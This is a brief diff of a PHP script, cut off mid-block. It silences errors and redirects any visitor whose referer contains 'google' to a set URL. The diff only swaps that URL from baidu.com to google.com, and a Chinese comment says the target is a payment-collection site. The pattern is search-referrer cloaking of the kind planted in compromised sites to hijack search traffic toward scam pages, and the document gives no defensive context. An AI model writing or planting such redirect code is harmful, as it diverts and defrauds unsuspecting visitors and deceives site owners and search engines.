@@ -1,6 +1,6 @@
 <?php 
 error_reporting(0);
-$url='http://www.baidu.com/'; //如果是谷歌点击则跳转至收款站
+$url='http://www.google.com/'; //如果是谷歌点击则跳转至收款站
 $str=strpos($_SERVER['HTTP_REFERER'],'google');
 if($str){
     header("location:{$url}");
